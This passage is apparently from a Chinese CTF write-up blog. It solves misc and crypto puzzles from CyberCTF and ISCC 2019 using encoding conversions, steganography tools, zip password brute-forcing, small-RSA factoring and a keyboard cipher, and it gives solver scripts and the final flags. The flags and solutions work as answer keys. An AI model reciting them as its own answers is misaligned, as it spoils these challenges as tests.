class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">01010111</span></span><br><span class="line"><span class="number">01101111</span></span><br><span class="line"><span class="number">01010010</span></span><br><span class="line"><span class="number">01100100</span></span><br><span class="line"><span class="number">01110011</span></span><br><span class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">01100010</span></span><br><span class="line"><span class="number">01001111</span></span><br><span class="line"><span class="number">00110000</span></span><br><span class="line"><span class="number">01001011</span></span><br><span class="line"><span class="number">01011111</span></span><br><span class="line"><span class="number">00100001</span></span><br><span class="line"><span class="number">01111101</span></span><br></pre></td></tr></table></figure>
+
+<p>然后放入python脚本跑，得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>) <span class="keyword">as</span> p:</span><br><span class="line">    data = p.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        data[i]=data[i].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        flag += chr(int(data[i],<span class="number">2</span>))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_c4n_ReaD_nO_WoRds_bO0K_!&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="基础社工"><a href="#基础社工" class="headerlink" title="基础社工"></a>基础社工</h1><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>大家都用着我们的数字杭电（i.hdu.edu.cn)但是对于其注册者却啥也不知道，所以小y打算去看看注册数字杭电的创始人的邮箱</p>
+<p>flag形式为：flag{你找到的电子邮箱}</p>
+<h4 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h4><p>百度社工，查询基础的社工知识，然后查询IP的创始人可以看看whois查询</p>
+<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><p>whois查询</p>
+<h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;anti_spam@mail.hz.zj.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="The-World"><a href="#The-World" class="headerlink" title="The World"></a>The World</h1><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>历经千辛万苦的承太郎一行人终于看见了DIO的替身能力，在这之后发现了DIO的三条线索，你能能知道DIO的真正能力吗？</p>
+<p>![The World](C:\Users\lijin\d\github\blog\source_posts\CyberCTF-misc-crypto\The World.jpg)</p>
+<h4 id="Analyze-3"><a href="#Analyze-3" class="headerlink" title="Analyze"></a>Analyze</h4><p>读题，三条线索，所以我们要解决三个东西，首先binwalk+foremost得到两张图和两个压缩包，有一张图是原图，没用，所以是两个压缩包和一张图</p>
+<h4 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h4><h5 id="1、压缩包爆破"><a href="#1、压缩包爆破" class="headerlink" title="1、压缩包爆破"></a>1、压缩包爆破</h5><p>从最小数字的压缩包开始，用工具<code>Advanced Archive Password Recovery</code>即可爆破，只有六位的数字密码<code>abc123</code>，得到第一个KEY1:<code>d2abd3fb9d4c93fb064abf81f5fab84</code></p>
+<h5 id="2、outguess解密"><a href="#2、outguess解密" class="headerlink" title="2、outguess解密"></a>2、outguess解密</h5><p>第二个数字的图片是一张用outguess加密后的图像，可以用 stegdetect来检查是哪种图像隐写，然后outguess便是我们第一关的KEY1，<code>outguess -r flag.jpg -t secret.txt -k d2abd3fb9d4c93fb064abf81f5fab84</code>解密后得到KEY2：<code>95cca6c50e48e86c468ee329ddc11047</code></p>
+<h5 id="3、MP3STEGO隐写"><a href="#3、MP3STEGO隐写" class="headerlink" title="3、MP3STEGO隐写"></a>3、MP3STEGO隐写</h5><p>解压压缩包是一个MP3音频，很容易想到就是MP3STEGO,下载个脚本<code>Decode -X -P 95cca6c50e48e86c 3.mp3</code>跑一下就可以得到flag的Base64加密<code>ZmxhZ3tlMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZX0=</code>,解密即可得到flag</p>
+<h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e10adc3949ba59abbe56e057f20f883e&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Different-P"><a href="#Different-P" class="headerlink" title="Different_P"></a>Different_P</h1><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p>你在CTF是终于看见了两个flag的图片，你迫不及待的提交上去结果发现是错误的，你能找出他们的不同吗？</p>
+<p><img src="/2019/07/15/CyberCTF-misc-crypto/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CCyberCTF-misc-crypto%5C%EF%BC%9Fflag.png" alt="？flag"></p>
+<p><img src="/2019/07/15/CyberCTF-misc-crypto/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CCyberCTF-misc-crypto%5Cflag%EF%BC%9F.png" alt="flag？"></p>
+<h4 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h4><p>首先放进stegsolve来看两图的区别，然后发现是两个有效像素位有差异，根据这个写脚本即可</p>
+<h4 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">im1=Image.open(<span class="string">'a1.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">im2=Image.open(<span class="string">'a2.png'</span>).convert(<span class="string">'L'</span>)</span><br><span class="line">length = im1.size[<span class="number">0</span>]</span><br><span class="line">hight = im1.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">flag1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,hight):</span><br><span class="line">        pix1 = im1.getpixel((x,y))</span><br><span class="line">        pix2 = im2.getpixel((x,y))</span><br><span class="line">        <span class="keyword">if</span> pix1 == <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=str(pix2-pix1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(flag)/<span class="number">8</span>)):</span><br><span class="line">    word = flag[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    word = int(word,<span class="number">2</span>)</span><br><span class="line">    flag1 += chr(int(word))</span><br><span class="line">missing_padding = <span class="number">4</span> - len(flag1) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> missing_padding:</span><br><span class="line">    flag1 += <span class="string">'='</span> * missing_padding</span><br><span class="line">print(flag1)</span><br><span class="line">p1 = open(<span class="string">'11.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">p1.write(flag)</span><br><span class="line">data = base64.b64decode(flag1)</span><br><span class="line">pic = open(<span class="string">'fin.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">pic.write(data)</span><br><span class="line">pic.close()</span><br></pre></td></tr></table></figure>
+
+<p>最后得到一个png格式的图，但是无法打开，所以放入HxD查看后发现第九、十字节的<code>0E</code>被替换成了<code>0D</code>修复后即可得到一个二维码,扫码可得flag</p>
+<p><img src="/2019/07/15/CyberCTF-misc-crypto/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CCyberCTF-misc-crypto%5Cfin.png" alt="fin"></p>
+<h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th1s_IS_TRuE_Fl4G!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><hr>
+<h1 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h1><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p>RSA真好玩,再来些其他东西就更好玩了（PS:e=65537)</p>
+<h4 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h4><p>就是一个贼简单的RSA。。。。</p>
+<h4 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h4><p>打开有一个加密后flag和公钥，通过openssl打开公钥得到n<code>BF7BCADE163E91CEFC32B4B142E6C0088E3E247BAEB695AF7DC535D43CA92291</code>，转成十进制<code>86610476408584443295800746944332088656793015624412548800847142179230238450321</code>,运用yahu或者直接上网查询可得到p：<code>266003124642196143283201674051722872679</code>,q：<code>325599470025343459464298434497151836999</code>，然后使用RSATool解密(也可以自己写脚本解密，因为图快出题菜鸡没写脚本=。=)<code>$ python rsatool.py -o private.pem -e 65537 -p 266003124642196143283201674051722872679 -q 325599470025343459464298434497151836999</code>得到私钥，最后导入openssl解密flag.enc，得到<code>}Y!s04tEP{ygraCl_f</code>，其实这个是一个倒叙密码加上栅栏密码（但是很好对出来正确flag=。=),解密后得到flag</p>
+<h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;E4sY_CryPt0!&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/05/15/ISCC-Misc/">
+                第16届(2019)全国大学生信息安全与对抗技术竞赛(ISCC2019)
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-05-15</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="ISCC-Week1——writeup"><a href="#ISCC-Week1——writeup" class="headerlink" title="ISCC_Week1——writeup"></a>ISCC_Week1——writeup</h1><h2 id="只会misc的菜鸡"><a href="#只会misc的菜鸡" class="headerlink" title="只会misc的菜鸡"></a>只会misc的菜鸡</h2><hr>
+<h1 id="隐藏的信息-pt50"><a href="#隐藏的信息-pt50" class="headerlink" title="隐藏的信息-pt50"></a>隐藏的信息-pt50</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>文件打开是一堆0+XXX的一堆数字</p>
+<h4 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h4><p>容易知道是八进制，把格式稍微转化一下得到下面文本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">0126</span><br><span class="line">062</span><br><span class="line">0126</span><br><span class="line">0163</span><br><span class="line">0142</span><br><span class="line">0103</span><br><span class="line">0102</span><br><span class="line">0153</span><br><span class="line">0142</span><br><span class="line">062</span><br><span class="line">065</span><br><span class="line">0154</span><br><span class="line">0111</span><br><span class="line">0121</span><br><span class="line">0157</span><br><span class="line">0113</span><br><span class="line">0111</span><br><span class="line">0105</span><br><span class="line">0132</span><br><span class="line">0163</span><br><span class="line">0131</span><br><span class="line">0127</span><br><span class="line">0143</span><br><span class="line">066</span><br><span class="line">0111</span><br><span class="line">0105</span><br><span class="line">0154</span><br><span class="line">0124</span><br><span class="line">0121</span><br><span class="line">060</span><br><span class="line">0116</span><br><span class="line">067</span><br><span class="line">0124</span><br><span class="line">0152</span><br><span class="line">0102</span><br><span class="line">0146</span><br><span class="line">0115</span><br><span class="line">0107</span><br><span class="line">065</span><br><span class="line">0154</span><br><span class="line">0130</span><br><span class="line">062</span><br><span class="line">0116</span><br><span class="line">0150</span><br><span class="line">0142</span><br><span class="line">0154</span><br><span class="line">071</span><br><span class="line">0172</span><br><span class="line">0144</span><br><span class="line">0104</span><br><span class="line">0102</span><br><span class="line">0167</span><br><span class="line">0130</span><br><span class="line">063</span><br><span class="line">0153</span><br><span class="line">0167</span><br><span class="line">0144</span><br><span class="line">0130</span><br><span class="line">060</span><br><span class="line">0113</span><br></pre></td></tr></table></figure>
+
+<h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><p>Python写个简易脚本完事</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>) <span class="keyword">as</span> m:</span><br><span class="line">    t = m.readlines()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(t)):</span><br><span class="line">        a = t[x].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">        flag += chr(int(a,<span class="number">8</span>))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>之后得到<code>V2VsbCBkb25lIQoKIEZsYWc6IElTQ0N7TjBfMG5lX2Nhbl9zdDBwX3kwdX0K</code> 可以看出是base64加密，在脚本里加一点操作得到flag</p>
+<p>最终脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>) <span class="keyword">as</span> m:</span><br><span class="line">    t = m.readlines()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(t)):</span><br><span class="line">        a = t[x].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">        flag += chr(int(a,<span class="number">8</span>))</span><br><span class="line">    print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
+
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;N0_0ne_can_st0p_y0u&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="倒立屋-100pt"><a href="#倒立屋-100pt" class="headerlink" title="倒立屋-100pt"></a>倒立屋-100pt</h1><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>一张图片</p>
+<p><img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C1.png" alt></p>
+<h4 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h4><p>把所有的图片隐写方式试了下最后发现是LSB图片隐写</p>
+<h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p>（现在还不会自己写LSB的脚本）用了下Stegsolve，然后把RGB的0通道给选中，得到信息<img src="/2019/05/15/ISCC-Misc/C:%5CUsers%5Clijin%5Cd%5Cgithub%5Cblog%5Csource_posts%5CISCC-Misc%5C2.jpg" alt></p>
+<p>之后就是疯狂尝试开脑洞，题目名称为倒立屋所以把前面的IsCc_2019倒着输入即为flag。</p>
+<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9102_cCsI</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Keyes’-secret-pt200"><a href="#Keyes’-secret-pt200" class="headerlink" title="Keyes’ secret-pt200"></a>Keyes’ secret-pt200</h1><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>打开题目是一堆大写的英文字符</p>
+<h4 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h4><p>看着键盘大概猜测到是看键盘来书写形状换成正常字符（打死出题人）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RFVGYHNWSXCDEWSXCVWSXCVTGBNMJUY,WSXZAQWDVFRQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVT,QWERTYTRFVBGRDXCVBNBVCXSWERFTYUIOJMTGBNMJUMNBVCDRTGHUWSXCDEQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYTRFVGWSXCVGRDXCVBCVGREDQWERTY(TRFVBTYUIOJMTRFVG),QWERTYGRDXCVBQWERTYTYUIOJMEFVTNBVCXSWERFWSXCDEQWERTYTGBNMJUYTRFVGQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMTGBNMJUYIUYHNBVNBVCXSWERFTGBNMJUYMNBVCDRTGHUTYUIOJM,QWERTYWSXIUYHNBVQWERTYGRDXCVBQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFTGBNMJUTYUIOJMWSXCDEMNBVCDRTGHUQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXTYUIOJMEFVTQWERTYTRFVBTGBNMJUYXSWEFTYHNNBVCXSWERFWSXCDETYUIOJMWSXTYUIOJMWSXTGBNMJUYZAQWDVFR.QWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYTGBNMJUIUYHNBVTGBNMJUGRDXCVBWSXCVWSXCVEFVTQWERTYWSXCFEWSXCDEIUYHNBVWSXCVGREDZAQWDVFRWSXCDEWSXCFEQWERTYTYUIOJMTGBNMJUYQWERTYIUYHNBVWSXCDEMNBVCDRTGHUEFVGYWSXCDEQWERTYGRDXCVBIUYHNBVQWERTYGRDXCVBZAQWDVFRQWERTYWSXCDEWSXCFETGBNMJUTRFVBGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYWSXCDERGNYGCWSXCDEMNBVCDRTGHUTRFVBWSXIUYHNBVWSXCDEQWERTYTYUIOJMTGBNMJUYQWERTYCVGREDWSXEFVGYWSXCDEQWERTYNBVCXSWERFGRDXCVBMNBVCDRTGHUTYUIOJMWSXTRFVBWSXNBVCXSWERFGRDXCVBZAQWDVFRTYUIOJMIUYHNBVQWERTYWSXCDERGNYGCNBVCXSWERFWSXCDEMNBVCDRTGHUWSXWSXCDEZAQWDVFRTRFVBWSXCDEQWERTYWSXZAQWDVFRQWERTYIUYHNBVWSXCDETRFVBTGBNMJUMNBVCDRTGHUWSXZAQWDVFRCVGREDQWERTYGRDXCVBQWERTYXSWEFTYHNGRDXCVBTRFVBRFVGYHNWSXZAQWDVFRWSXCDE,QWERTYGRDXCVBIUYHNBVQWERTYEFVGYWDCFTWSXCDEWSXCVWSXCVQWERTYGRDXCVBIUYHNBVQWERTYTRFVBTGBNMJUYZAQWDVFRWSXCFETGBNMJUTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBTRFVBTYUIOJMWSXZAQWDVFRCVGREDQWERTYTYUIOJMTGBNMJUYQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYIUYHNBVTGBNMJUYMNBVCDRTGHUTYUIOJMQWERTYTGBNMJUYTRFVGQWERTYGRDXCVBTYUIOJMTYUIOJMGRDXCVBTRFVBQAZSCEIUYHNBVQWERTYTRFVGTGBNMJUYTGBNMJUZAQWDVFRWSXCFEQWERTYWSXZAQWDVFRQWERTYTYUIOJMRFVGYHNWSXCDEQWERTYMNBVCDRTGHUWSXCDEGRDXCVBWSXCVQWERTYEFVGYWDCFTTGBNMJUYMNBVCDRTGHUWSXCVWSXCFEQWERTY(WSX.WSXCDE.,QWERTYYHNMKJTGBNMJUCVGREDQWERTYYHNMKJTGBNMJUYTGBNMJUZAQWDVFRTYUIOJMEFVTQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNIUYHNBVQWERTYWSXZAQWDVFRQWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTRFVGWSXCDEIUYHNBVIUYHNBVWSXTGBNMJUYZAQWDVFRGRDXCVBWSXCVQWERTYIUYHNBVWSXCDETYUIOJMTYUIOJMWSXZAQWDVFRCVGREDIUYHNBV).QWERTYRFVGYHNWSXCDEMNBVCDRTGHUWSXCDEQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYEFVTTGBNMJUYTGBNMJUMNBVCDRTGHUQWERTYTRFVGWSXCVGRDXCVBCVGRED&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;QWERTYMNBVCDRTGHUWSXCDEEFVGYWSXCDEMNBVCDRTGHUIUYHNBVWSXCDE-WSXCDEZAQWDVFRCVGREDWSXZAQWDVFRWSXCDEWSXCDEMNBVCDRTGHUWSXZAQWDVFRCVGRED,QWERTYZAQWDVFRWSXCDETYUIOJMEFVGYWDCFTTGBNMJUYMNBVCDRTGHUQAZSCEQWERTYIUYHNBVZAQWDVFRWSXTRFVGTRFVGWSXZAQWDVFRCVGRED,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYTYUIOJMTGBNMJUYTRFVBTGBNMJUYWSXCVQWERTYGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBV,QWERTYIUYHNBVEFVTIUYHNBVTYUIOJMWSXCDEXSWEFTYHNQWERTYGRDXCVBWSXCFEXSWEFTYHNWSXZAQWDVFRWSXIUYHNBVTYUIOJMMNBVCDRTGHUGRDXCVBTYUIOJMWSXTGBNMJUYZAQWDVFR,QWERTYNBVCXSWERFMNBVCDRTGHUTGBNMJUYCVGREDMNBVCDRTGHUGRDXCVBXSWEFTYHNXSWEFTYHNWSXZAQWDVFRCVGRED,QWERTYGRDXCVBZAQWDVFRWSXCFEQWERTYTRFVBMNBVCDRTGHUEFVTNBVCXSWERFTYUIOJMGRDXCVBZAQWDVFRGRDXCVBWSXCVEFVTIUYHNBVWSXIUYHNBVQWERTYGRDXCVBMNBVCDRTGHUWSXCDEQWERTYGRDXCVBWSXCVWSXCVQWERTYIUYHNBVQAZSCEWSXWSXCVWSXCVIUYHNBVQWERTYEFVGYWDCFTRFVGYHNWSXTRFVBRFVGYHNQWERTYRFVGYHNGRDXCVBEFVGYWSXCDEQWERTYYHNMKJWSXCDEWSXCDEZAQWDVFRQWERTYMNBVCDRTGHUWSXCDEQAZXCDEWVTGBNMJUWSXMNBVCDRTGHUWSXCDEWSXCFEQWERTYYHNMKJEFVTQWERTYNBVCXSWERFMNBVCDRTGHUWSXTGBNMJUYMNBVCDRTGHUQWERTYTRFVBTYUIOJMTRFVGQWERTYTRFVBTGBNMJUYZAQWDVFRTYUIOJMWSXCDEIUYHNBVTYUIOJMIUYHNBVQWERTYGRDXCVBTYUIOJMQWERTYWSXCFEWSXCDETRFVGQWERTYTRFVBTGBNMJUYZAQWDVFR.</span><br></pre></td></tr></table></figure>
+
+<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><p>大概有27种组合的字母书写，写了个替代脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">a = open(<span class="string">'keyes.txt'</span>)</span><br><span class="line">text = a.read()</span><br><span class="line">text = text.replace(<span class="string">"WSXCDE"</span>,<span class="string">'E'</span>)</span><br><span class="line">text = text.replace(<span class="string">"RFVGYHN"</span>,<span class="string">'H'</span>)</span><br><span class="line">text = text.replace(<span class="string">"WSXCV"</span>,<span class="string">'L'</span>)</span><br><span class="line">text = text.replace(<span class="string">"TGBNMJUY"</span>,<span class="string">'O'</span>)</span><br><span class="line">text = text.replace(<span class="string">"TGBNMJU"</span>,<span class="string">'U'</span>)</span><br><span class="line">text = text.replace(<span class="string">"GRDXCVB"</span>,<span class="string">'A'</span>)</span><br><span class="line">text = text.replace(<span class="string">"CVGRED"</span>,<span class="string">'G'</span>)</span><br><span class="line">text = text.replace(<span class="string">"QWERTYTRFVG"</span>,<span class="string">'F'</span>)</span><br><span class="line">text = text.replace(<span class="string">"WSXCFE"</span>,<span class="string">'D'</span>)</span><br><span class="line">text = text.replace(<span class="string">"IUYHNBV"</span>,<span class="string">'S'</span>)</span><br><span class="line">text = text.replace(<span class="string">"QWERTY"</span>,<span class="string">' '</span>)</span><br><span class="line">text = text.replace(<span class="string">"TRFVB"</span>,<span class="string">'C'</span>)</span><br><span class="line">text = text.replace(<span class="string">"QAZSCE"</span>,<span class="string">'K'</span>)</span><br><span class="line">text = text.replace(<span class="string">"NBVCXSWERF"</span>,<span class="string">'P'</span>)</span><br><span class="line">text = text.replace(<span class="string">"MNBVCDRTGHU"</span>,<span class="string">'R'</span>)</span><br><span class="line">text = text.replace(<span class="string">"WSX"</span>,<span class="string">'I'</span>)</span><br><span class="line">text = text.replace(<span class="string">"EFVT"</span>,<span class="string">'Y'</span>)</span><br><span class="line">text = text.replace(<span class="string">"YHNMKJ"</span>,<span class="string">'B'</span>)</span><br><span class="line">text = text.replace(<span class="string">"ZAQWDVFR"</span>,<span class="string">'N'</span>)</span><br><span class="line">text = text.replace(<span class="string">'XSWEFTYHNXSWEFTYHN'</span>,<span class="string">'M'</span>)</span><br><span class="line">text = 